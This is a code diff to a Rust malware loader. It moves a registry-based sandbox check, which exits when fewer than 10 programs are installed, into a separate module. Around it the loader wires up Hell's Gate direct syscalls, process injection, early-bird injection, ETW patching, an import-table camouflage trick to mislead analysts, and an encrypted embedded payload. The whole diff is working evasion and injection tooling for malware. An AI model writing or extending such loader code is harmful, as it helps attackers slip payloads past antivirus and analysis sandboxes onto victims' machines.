@@ -7,6 +7,7 @@ mod peb;
 mod hellsgate;
 mod syscall;
 mod inject;
+mod syscheck;
 
 #[cfg(feature = "early_bird")]
 mod early_bird;
@@ -31,13 +32,6 @@ mod generated {
 use generated::{ENC_KEY, HINT_BYTE, PAYLOAD, SLEEP_MS};
 use types::*;
 
-#[cfg(windows)]
-use windows_sys::Win32::System::Threading::GetCurrentThreadId;
-#[cfg(windows)]
-use windows_sys::Win32::System::Registry::{
-    RegCloseKey, RegOpenKeyExW, RegQueryInfoKeyW,
-    HKEY_LOCAL_MACHINE, KEY_READ,
-};
 
 // IatCamouflage: imports benign APIs in a dead code path so they appear in the IAT.
 // Uses a compile-time seed so the dead branch is never taken.
@@ -73,42 +67,6 @@ fn iat_camouflage() {
     }
 }
 
-/// Count installed programs under HKLM\...\Uninstall via the registry.
-/// Returns the subkey count — used as a sandbox check (real systems have
-/// many installed apps; automated analysis VMs typically have < 10).
-#[cfg(windows)]
-fn enum_installed_software() -> u32 {
-    let subkey: Vec<u16> = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\0"
-        .encode_utf16()
-        .collect();
-    let mut hkey = 0isize;
-    let rc = unsafe {
-        RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey)
-    };
-    if rc != 0 {
-        return 0;
-    }
-    let mut num_subkeys: u32 = 0;
-    unsafe {
-        RegQueryInfoKeyW(
-            hkey,
-            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
-            &mut num_subkeys,
-            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
-            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
-            core::ptr::null_mut(),
-        );
-        RegCloseKey(hkey);
-    }
-    num_subkeys
-}
-
-/// Wrapper around GetCurrentThreadId — pulls the Win32 API into the IAT and
-/// can be used at runtime to verify we're running on the expected thread.
-#[cfg(target_arch = "x86_64")]
-fn get_current_thread_id() -> u32 {
-    unsafe { GetCurrentThreadId() }
-}
 
 fn main() {
     // Loader execution order mirrors main.c:
@@ -118,14 +76,13 @@ fn main() {
     #[cfg(windows)]
     iat_camouflage();
 
-    // Sandbox check: bail out if fewer than 10 programs are installed
-    #[cfg(windows)]
-    if enum_installed_software() < 10 {
+    // Sandbox check: bail if fewer than 10 installed programs (registry)
+    if syscheck::enum_installed_software() < 10 {
         return;
     }
 
     #[cfg(target_arch = "x86_64")]
-    let _tid = get_current_thread_id();
+    let _tid = syscheck::get_current_thread_id();
     #[cfg(feature = "etw_patch")]
     unsafe { etw::patch_etw(); }
 
